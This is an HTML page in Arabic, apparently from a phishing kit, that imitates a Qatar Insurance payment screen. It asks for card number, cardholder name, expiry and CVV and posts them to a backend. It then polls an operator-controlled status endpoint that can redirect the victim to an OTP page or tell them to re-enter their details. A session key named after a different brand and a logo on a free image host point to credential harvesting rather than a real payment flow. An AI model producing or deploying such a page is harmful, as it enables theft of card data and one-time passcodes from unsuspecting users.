<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بيانات البطاقة - قطر للتأمين</title>
<style>
  :root {
    --green: #1a6b3c;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
    --text-dark: #2b2b2b;
    --card-bg: #ffffff;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--text-dark);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
  }
  .screen {
    width: 100%;
    max-width: 440px;
    display: flex;
    flex-direction: column;
    padding: 24px;
    background: var(--card-bg);
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  }
  @media (max-width: 480px) {
    body { background: var(--card-bg); padding: 0; align-items: flex-start; }
    .screen { box-shadow: none; border-radius: 0; min-height: 100vh; padding: 16px 20px 0 20px; }
  }
  .logo-wrap { display: flex; justify-content: center; margin-bottom: 24px; }
  .logo-wrap img { max-width: 220px; width: 100%; height: auto; }
  .secure-icon {
    width: 50px; height: 50px;
    background-color: rgba(26, 107, 60, 0.05);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 16px;
    color: var(--green);
  }
  h2 { color: var(--green); font-size: 19px; margin: 0 0 8px; text-align: center; }
  p.desc { color: var(--muted); font-size: 13px; line-height: 1.6; margin: 0 0 24px; text-align: center; }
  .field { margin-bottom: 16px; text-align: right; }
  .field label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
  .field input {
    width: 100%;
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 12px 14px;
    font-size: 15px;
    color: var(--text-dark);
    background: #fff;
    font-family: inherit;
  }
  .field input:focus { outline: none; border-color: var(--green); }
  .field input.card-number { direction: ltr; text-align: left; letter-spacing: 2px; }
  .row { display: flex; gap: 12px; }
  .row .field { flex: 1; }
  .btn-submit {
    width: 100%;
    background-color: #1565c0;
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 8px;
    box-shadow: 0 4px 12px rgba(21, 101, 192, 0.2);
  }
  .btn-submit:hover { background-color: #0d47a1; }
  .btn-submit:disabled { background-color: #cccccc; cursor: not-allowed; box-shadow: none; }
  .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }

  .overlay {
    position: fixed; inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: none; align-items: center; justify-content: center;
    flex-direction: column; gap: 18px; z-index: 999; padding: 24px; text-align: center;
  }
  .overlay.show { display: flex; }
  .spinner {
    width: 46px; height: 46px;
    border: 4px solid #e2e6e9;
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .overlay p { font-size: 14px; color: var(--green); font-weight: 600; margin: 0; max-width: 300px; line-height: 1.7; }
  .reject-icon {
    width: 56px; height: 56px; border-radius: 50%;
    background: #c0392b;
    display: flex; align-items: center; justify-content: center;
  }
  .reject-icon svg { width: 26px; height: 26px; }
  .overlay button {
    margin-top: 6px; background: #1565c0; color: #fff; border: none;
    border-radius: 6px; padding: 10px 24px; font-size: 13.5px; font-weight: 700; cursor: pointer;
  }
  .overlay button:hover { background: #0d47a1; }
</style>
</head>
<body>

  <div class="screen">
    <div class="logo-wrap">
      <img src="https://i.ibb.co/kVxnFRHX/Watar-Insurance-Company-01.png" alt="Qatar Insurance" />
    </div>

    <div class="secure-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
      </svg>
    </div>
    <h2>بيانات البطاقة</h2>
    <p class="desc">يرجى إدخال بيانات بطاقتك البنكية لإتمام عملية الدفع بشكل آمن.</p>

    <div id="cardForm">
      <div class="field">
        <label for="cardNumber">رقم البطاقة</label>
        <input type="text" id="cardNumber" class="card-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
      </div>
      <div class="field">
        <label for="cardHolder">اسم حامل البطاقة</label>
        <input type="text" id="cardHolder" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name">
      </div>
      <div class="row">
        <div class="field">
          <label for="cardExpiry">تاريخ الانتهاء</label>
          <input type="text" id="cardExpiry" inputmode="numeric" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp">
        </div>
        <div class="field">
          <label for="cardCvv">CVV</label>
          <input type="text" id="cardCvv" inputmode="numeric" maxlength="4" placeholder="123" autocomplete="cc-csc">
        </div>
      </div>
      <button class="btn-submit" id="btnSubmit" type="button">تأكيد الدفع</button>
      <div class="error-msg" id="errorMsg">حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.</div>
    </div>
  </div>

  <div class="overlay" id="waitOverlay">
    <div class="spinner"></div>
    <p>جاري التحقق من بيانات البطاقة...</p>
  </div>

  <div class="overlay" id="rejectOverlay">
    <div class="reject-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
    <p style="color:#c0392b; font-weight:bold; font-size:16px;">فشل الدفع البيانات طرق الدفع غير صحيحة</p>
    <button type="button" id="retryBtn" style="background-color:#c0392b;">إعادة المحاولة</button>
  </div>

  <script>
    var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      requestId = '999';
      localStorage.setItem('requestId', requestId);
    }

    var cardForm = document.getElementById('cardForm');
    var waitOverlay = document.getElementById('waitOverlay');
    var rejectOverlay = document.getElementById('rejectOverlay');
    var errorMsg = document.getElementById('errorMsg');
    var pollTimer = null;

    function stopPoll() { clearInterval(pollTimer); pollTimer = null; }

    function pollStatus() {
      pollTimer = setInterval(function() {
        fetch('/api/status/' + requestId)
          .then(function(res) { return res.json(); })
          .then(function(data) {
            if (!data.ok) return;
            if (data.stage === 'otp' && data.decision === 'pending') {
              stopPoll();
              window.location.href = 'otp-ar.html?id=' + requestId;
            } else if (data.decision === 'rejected') {
              stopPoll();
              waitOverlay.classList.remove('show');
              rejectOverlay.classList.add('show');
            }
          })
          .catch(function() {});
      }, 2500);
    }

    document.getElementById('btnSubmit').addEventListener('click', function() {
      var number = document.getElementById('cardNumber').value.replace(/\D/g, '');
      var holder = document.getElementById('cardHolder').value.trim();
      var expiry = document.getElementById('cardExpiry').value.trim();
      var cvv = document.getElementById('cardCvv').value.trim();

      if (number.length < 12 || !holder || !expiry || !cvv) {
        errorMsg.style.display = 'block';
        return;
      }
      errorMsg.style.display = 'none';
      cardForm.style.display = 'none';
      waitOverlay.classList.add('show');

      fetch('/api/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: requestId,
          cardNumber: number,
          cardHolder: holder,
          cardExpiry: expiry,
          cardCvv: cvv
        })
      })
      .then(function(res) { return res.json(); })
      .then(function(data) {
        if (data.ok) { pollStatus(); }
        else { throw new Error('failed'); }
      })
      .catch(function() {
        waitOverlay.classList.remove('show');
        cardForm.style.display = 'block';
        errorMsg.style.display = 'block';
      });
    });

    document.getElementById('retryBtn').addEventListener('click', function() {
      rejectOverlay.classList.remove('show');
      cardForm.style.display = 'block';
    });
  </script>

</body>
</html>
